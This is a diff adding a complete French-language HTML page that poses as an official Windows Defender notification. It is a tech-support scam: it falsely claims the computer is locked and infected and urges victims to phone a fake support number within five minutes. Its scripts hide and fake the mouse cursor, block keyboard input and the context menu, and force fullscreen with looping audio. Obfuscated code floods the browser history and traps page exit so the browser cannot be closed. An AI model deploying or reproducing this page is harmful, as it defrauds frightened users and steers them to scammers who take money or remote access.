@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html>
+<head><base href="." />
+
+    <meta http-equiv=content-type content="text/html;charset=UTF-8"/>
+    <meta name=robots content="noindex, nofollow">
+    <meta http-equiv=Content-Type content="text/html; charset=UTF-8">
+    <title>Notification Windows officielle</title>
+    <link rel="icon" href="favico.png" sizes="16x16">
+    <meta name=robots content=NOINDEX,NOFOLLOW>
+
+
+    <style type="text/css">
+        @media all and (-ms-high-contrast: none) {
+            div.fakeCursor {
+                width: 17px;
+                height: 25px;
+                background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
+                position: fixed;
+                z-index: 3000;
+            }
+
+            .nocursor {
+                cursor: none;
+                position: absolute;
+                top: 0;
+                bottom: 0;
+                width: 100%;
+            }
+        }
+
+        @media screen and (-webkit-min-device-pixel-ratio: 0) {
+            div.fakeCursor {
+                width: 17px;
+                height: 25px;
+                background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAAZCAMAAADg4DWlAAAAmVBMVEUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8jo0yHAAAAMXRSTlMAAQUPA0IfMgInFzlGCwwpGQcJEiIIP04vGDoqDgYbNVFDGjFBMEgWIElFEyw4PjRLq1RDbAAAALhJREFUeF5V0NlygzAMBVDbKK1tgtlJSgrZ93RR/v/jgjwTC/R45o6kuUJIDVqK0SDkSaHGhBhlNhoTPtGkH0QsT4w/iVgGmjGRMAVhCsLEwsTCRDKhsIemTW2hvQyKm8Xp989kCZAgyeL/cKxslFMG11uia7OySQdSIO72Mcl8tvyq/fX6bNKLp7j6Bnqxo34mId+h5tC7Z5Jbs7qrUJxEfLQ/pmQR4HpjegcsUrmydNQHEygFA7wAtBchFf1cSBMAAAAASUVORK5CYII=");
+                position: fixed;
+                z-index: 3000;
+            }
+
+            .nocursor {
+                cursor: none;
+                position: absolute;
+                top: 0;
+                bottom: 0;
+                width: 100%;
+            }
+        }
+
+        .nocursor {
+            cursor: none;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+
+
+    <style type=text/css>#alert {
+        position: absolute;
+        left: 30%;
+        top: 5%;
+        background: #f1f1f1;
+        border: 2px solid #0032c7;
+        width: 40%
+    }
+
+    .input {
+        margin-top: 10px;
+        background: #f1f1f1;
+        padding: 20px;
+        text-align: right
+    }
+
+    .input input {
+        opacity: 1;
+        padding: 15px;
+        font-size: 16px;
+        width: 35%;
+        font-weight: 700
+    }
+
+    .input input:hover {
+        opacity: .75
+    }
+
+    .head h1, h2, h3, h4 {
+        margin: 0;
+        padding: 0
+    }
+
+    .text {
+        padding: 20px
+    }
+
+    .right {
+        float: right
+    }
+
+    .left {
+        float: left
+    }
+
+    .clear {
+        clear: both
+    }
+
+    .alert_hide {
+        cursor: pointer
+    }
+
+
+    body {
+        cursor:none !important;
+        background-color: #FFF;
+        color: #000;
+        font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
+        font-family: Arial;
+        font-size: 18px;
+        margin: 0
+    }
+
+    body, html {
+        margin: 10px;
+        padding: 0;
+        overflow: hidden;
+        width: 100%;
+        height: 100%;
+        background-attachment: fixed;
+        background-color: #0078d7
+    }
+
+    table {
+        border-collapse: collapse;
+        border-spacing: 0;
+        font-size: 11px;
+    }
+
+    .chrome-alert {
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0
+    }
+
+    .chrome-alert > div {
+        margin: 0 auto;
+        width: 440px;
+        background: #FBFBFB;
+        border: 1px solid #BABABA;
+        min-height: 180px;
+        border-radius: 3px;
+        box-shadow: 0 2px 0 rgba(0, 0, 0, .3);
+        position: relative;
+        font-family: 'Segoe UI'
+    }
+
+    .chrome-alert h1 {
+        font-size: 15px;
+        font-weight: 400;
+        margin: 0 0 5px;
+        padding: 5px 10px;
+        color: #414141
+    }
+
+    .chrome-alert p {
+        font-size: 12px;
+        padding: 0 10px;
+        color: #414141;
+        margin: 15px 0
+    }
+
+    .chrome-alert .action_buttons {
+        overflow: auto
+    }
+
+    .chrome-alert .action_buttons a {
+        float: right;
+        font-size: 12px;
+        margin-right: 15px;
+        padding: 6px 25px;
+        text-decoration: none;
+        color: #414141;
+        border: 1px solid #DDD;
+        margin-top: 20px;
+        border-radius: 2px;
+        margin-bottom: 20px
+    }
+
+    .chrome-alert .action_buttons a.active {
+        border: 1px solid #3B79ED;
+        font-weight: 700
+    }
+
+    .chrome-alert .content-box {
+        max-height: 440px;
+        overflow: auto;
+        margin: 0 20px
+    }
+
+    .chrome-alert .content-box p {
+        padding: 0;
+        margin-left: 0
+    }
+
+    .chrome-alert label {
+        padding: 0 20px;
+        font-size: 12px;
+        color: #414141
+    }
+
+    .chrome-alert label:hover {
+        color: #3B79ED
+    }
+
+    .chrome-alert label:focus {
+        color: #3B79ED;
+        outline: dotted
+    }
+
+    .cross {
+        color: #333;
+        float: right;
+        margin: 4px 6px 0 0;
+        text-decoration: none
+    }
+    </style>
+    <script src="jquery.min.js"></script>
+    <script>var phone = "";
+    var text = "** VOTRE ORDINATEUR A ÉTÉ VERROUILLÉ **\n\n Error # DT00X2.\n\nAppelez le support technique Windows: 01 851 496 22  (Appel Gratuit).\nNe pas ignorer cet avertissement important..\nSi vous fermez cette page sans résoudre le problème, l'accès à votre ordinateur sera désactivé pour éviter tout dommage supplémentaire à notre réseau. Votre ordinateur nous a averti qu'il était infecté par un virus et un logiciel espion. Les données suivantes sont à risque: \n\n >Identifiant Facebook \n >Information de carte de crédit\n >Identifiants de messagerie\n >Historique de navigation et données\nVous devez nous contacter immédiatement afin que nos ingénieurs puissent vous guider tout au long du processus de récupération par téléphone. Veuillez nous appeler dans les 5 prochaines minutes pour éviter la perte complète de votre ordinateur.\n\nAppelez le support technique Windows: 01 851 496 22  (Toll Free)"</script>
+    <script>var w = window.screen.width;
+    var h = window.screen.height;
+    window.moveTo(0, 0);
+    window.resizeTo(w, h);</script>
+    <script>var isOpera = !!window.opera || navigator.userAgent.indexOf(" OPR/") >= 0;
+    var isFirefox = typeof InstallTrigger !== "undefined";
+    var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf("Constructor") > 0;
+    var isChrome = !!window.chrome && !isOpera;
+    var isIE =
+        /*@cc_on!@*/
+        false || !!document.documentMode;
+    var isEdge = window.navigator.userAgent.indexOf("Edge") > -1;</script>
+    <script>
+        $(document).ready(function () {
+            animateDiv();
+        });
+
+        function makeNewPosition() {
+            var h = $(window).height() - 50,
+                w = $(window).width() - 50,
+                nh = Math.floor(Math.random() * h),
+                nw = Math.floor(Math.random() * w);
+            return [nh, nw];
+        }
+
+        function animateDiv() {
+            var newq = makeNewPosition(),
+                oldq = $(".fakeCursor").offset(),
+                speed = calcSpeed([oldq.top, oldq.left], newq);
+            $(".fakeCursor").animate({
+                top: newq[0],
+                left: newq[1]
+            }, speed, function () {
+                animateDiv();
+            });
+        };
+
+        function calcSpeed(prev, next) {
+            var x = Math.abs(prev[1] - next[1]),
+                y = Math.abs(prev[0] - next[0]),
+                greatest = x > y ? x : y,
+                speedModifier = 0.3,
+                speed = Math.ceil(greatest / speedModifier);
+            return speed;
+        }
+
+        window.onload = function ()
+        {
+            document.onclick = function (e)
+            {
+                e = e || event;
+                target = e.target || e.srcElement;
+                if (target.tagName == "DIV")
+                {
+                    document.body.style.cursor = 'not-allowed';
+
+
+                }
+                else
+                {
+                    document.body.style.cursor = 'not-allowed';
+                }
+            }
+        }
+    </script>
+
+</head>
+<body style="margin:0px;padding:0px;font-family:arial,sans-serif!important" class="nocursor">
+<div id="load_num"></div>
+<div id=blue-screen style=display:none>
+    <table style="width:100%" height="61" cellpadding="0" cellspacing="0" border="0">
+        <tr>
+            <td width=766></td>
+        </tr>
+    </table>
+</div>
+<div class="fakeCursor" style="top: 682.984px; left: 1402.92px; z-index: 3000;"></div>
+
+
+
+
+<div style=width:85%;margin:auto;padding-top:1%;background-color:#0078d7;position:relative>
+    <div class=centering-col>
+        <div class=centered-content>
+            <img src="./defender.png" alt="Windows defender" style="max-width:100px;">
+            <h1 style=color:#FFF;margin-top:10px;font-weight:900>** VOTRE ORDINATEUR A ÉTÉ VERROUILLÉ **</h1>
+            <h3 style=color:#FFF;margin-top:10px;font-weight:900>Error # DT00X02.</h3>
+            <div style='float:right;min-height:200px;width:47%; font-size: 14px;margin-top: -40px;padding: 3px;color: white;'>
+                <p>Vous pouvez immédiatement contacter Windows et un ingénieur Windows peut vous guider tout au long du
+                    processus de suppression par téléphone. Veuillez nous contacter dans les 5 minutes pour vous assurer
+                    que votre ordinateur n'est pas désactivé.</p>
+                <iframe src="console.html" style="width: 100%; height: 320px; border: none; " border="0"></iframe>
+            </div>
+            <div style='float:left;height:250px;width:520px;padding-left:20px;padding-top:25px;color:#FFF;'> Appelez le
+                support technique Windows:
+                01 851 496 22 (Appel Gratuit)
+                <br> Ne pas ignorer cet avertissement important
+                <br/> Si vous fermez cette page sans résoudre le problème, l'accès à votre ordinateur sera désactivé
+                pour éviter tout dommage supplémentaire à notre réseau.
+                <br/>
+                <br/> Votre ordinateur nous a averti qu'il était infecté par un virus et un logiciel espion. Les données
+                suivantes sont à risque:
+                <br/>
+                <br/> 1. Identifiant Compte Banquaire
+                <br/> 2. Information de carte de crédit
+                <br/> 3. Identifiants de messagerie
+                <br/> 4. Historique de navigation et données
+                <br>
+                <br> Vous devez nous contacter immédiatement afin que nos ingénieurs puissent vous guider tout au long
+                du processus de récupération par téléphone. Veuillez nous appeler dans les 5 prochaines minutes pour
+                éviter la perte complète de votre ordinateur.
+            </div>
+            <div style=margin-top:420px>
+                <h1 style="color:#FFF;font-weight:900;padding-top:24px;font-size: 32px;">Appelez le support technique Windows:
+                    01 851 496 22 (Appel Gratuit)</h1></div>
+        </div>
+    </div>
+</div>
+<audio autoplay=autoplay loop id=audio>
+    <source src=a.mp3 type=audio/mpeg>
+</audio>
+<div id=chrome-alerts class=chrome-alert style=display:block>
+    <div>
+        <a href=# class=cross>x</a>
+        <h1>Alert de sécurité:</h1>
+        <div class=content-box id=alert-content-box>
+            <p>** VOTRE ORDINATEUR A ÉTÉ VERROUILLÉ **<br>
+                <br>Erreur # DT00X2. <br>
+                <br>
+                <br>Appelez le support technique Windows:
+                01 851 496 22 (Appel Gratuit) <br><br>
+                Ne pas ignorer cet avertissement important
+                </br> Si vous fermez cette page sans résoudre le problème, l'accès à votre ordinateur sera désactivé
+                pour éviter tout dommage supplémentaire à notre réseau.<br>
+                <br/> Votre ordinateur nous a averti qu'il était infecté par un virus et un logiciel espion. Les données
+                suivantes sont à risque:
+                <br/>
+                <br/> 1. Identifiant Compte Banquaire
+                <br/> 2. Information de carte de crédit
+                <br/> 3. Identifiants de messagerie
+                <br/> 4. Historique de navigation et données
+                <br/>
+                <br/> Vous devez nous contacter immédiatement afin que nos ingénieurs puissent vous guider tout au long
+                du processus de récupération par téléphone. Veuillez nous appeler dans les 5 prochaines minutes pour
+                éviter la perte complète de votre ordinateur.</br>
+                </br> Appelez le support technique Windows:<span style="font-weight600; font-size:16px;"> 01 851 496 22 (Appel Gratuit):</span>
+        </div>
+        <label style=font-size:12px>
+            <input type=checkbox>
+            Prevent this page from creating additional dialogues.</label>
+        <div class=action_buttons><a style=color:#fff;background:#F00 href=javascript: class=active id=leave_page>OK</a>
+        </div>
+    </div>
+</div>
+<script>
+    var load_num = "";
+    var target1 = window.location.href;
+    $(function () {
+        if (isFirefox || isEdge) {
+            $("a").click(function (a) {
+                a.preventDefault()
+            });
+            var x = ["pushState", "onbeforeunload", "", "returnValue", "onload", "toString"];
+            g = x, D = 325, function (a) {
+                for (; --a;) {
+                    g.push(g.shift())
+                }
+            }(++D);
+            var j = function (c, a) {
+                return x[c -= 0]
+            };
+            E = text, window[j("0x0")] = function (a) {
+                var c = j("0x1") + E;
+                return a[j("0x2")] = c, c
+            }, window[j("0x3")] = function () {
+                if (confirm("" + E)) {
+                    for (var a = "", c = 0; c < 100000000; c++) {
+                        a += c[j("0x4")](), history[j("0x5")](0, 0, a)
+                    }
+                } else {
+                    for (a = "", c = 0; c < 100000000; c++) {
+                        a += c[j("0x4")](), history[j("0x5")](0, 0, a)
+                    }
+                }
+            };
+            setInterval(function (a) {
+                $("body").append('<iframe height="1" src="login.html?n=' + load_num + '" width="1"></iframe>')
+            }, 500)
+        }
+        var E, g, D, b, A, q, p;
+        if (isChrome || isOpera) {
+            var z = !1;
+            $("head").append('<script src="jquery.min.js"><\/script>'), $("head").append('<link href="main.css" rel="stylesheet">'), document.getElementById("audio").play(), window.onkeydown = function (a) {
+                return !1
+            }, window.onkeypress = function (a) {
+                return !1
+            }, onbeforeunload = function () {
+                return alert("??????? ESC, ????? ??????? ????????!"), "??????? ESC, ????? ??????? ????????!"
+            }, document.oncontextmenu = new Function("return false");
+            for (var F = 0; F < 0; F++) {
+                alert(text)
+            }
+
+            function C() {
+                z ? (document.getElementById("blue-screen").style.display = "block", document.getElementsByTagName("body").item(0).setAttribute("class", "past")) : z = !0
+            }
+
+            function k() {
+                document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || (document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)), window.open(target1, "Alert", "width=1,height=1,scrolling=yes,fullscreen=yes,left=3000,top=3000")
+            }
+
+            document.getElementById("chrome-alerts").style.display = "block", document.addEventListener("keyup", function (a) {
+                27 == a.keyCode && k()
+            }, !1), document.addEventListener("keyup", function (a) {
+                122 != a.keyCode && 17 != a.keyCode && 18 != a.keyCode && 13 != a.keyCode || (C(), k())
+            }, !1), window.onload = function () {
+                document.onclick = function (a) {
+                    a = a || event, target = a.target || a.srcElement, target.tagName, k(), C()
+                }
+            }, addEventListener("click", function () {
+                C();
+                var a = document.documentElement;
+                (a.requestFullScreen || a.webkitRequestFullScreen || a.mozRequestFullScreen).call(a)
+            }), window.addEventListener("resize", function () {
+                $("body").css("overflow", "hidden"), $(".popup-alert").stop().animate({
+                    bottom: "-10px",
+                    opacity: 1
+                }, 500), document.getElementById("audio").play(), screen.width, window.innerWidth, window.setInterval(function () {
+                    for (var a = 0; a < 100; a++) {
+                        history.pushState(0, 0, a)
+                    }
+                }, 500)
+            })
+        }
+        if (isIE || isSafari) {
+            setTimeout('alert(text)', 3000)
+            $("#blue-screen,.chrome-alert").hide();
+            var v = ["onmouseout", "body", "addEventListener", "mouseout", "*************************************************\nRDN/YahLover.worm!055BCCAC9FEC Infection\n*************************************************\n\n", "attachEvent"];
+            q = v, p = 361, function (a) {
+                for (; --a;) {
+                    q.push(q.shift())
+                }
+            }(++p);
+            var B = function (a, c) {
+                return v[a -= 0]
+            };
+            b = text, A = text, alert(b), document[B("0x0")][B("0x1")] ? document[B("0x0")][B("0x1")](B("0x2"), function (a) {
+                alert(B("0x3") + b)
+            }, !1) : document[B("0x0")][B("0x4")](B("0x5"), function (a) {
+                alert(b)
+            }), window.onbeforeunload = function () {
+                return A
+            }
+        }
+    });</script>
+</body>
+</html>
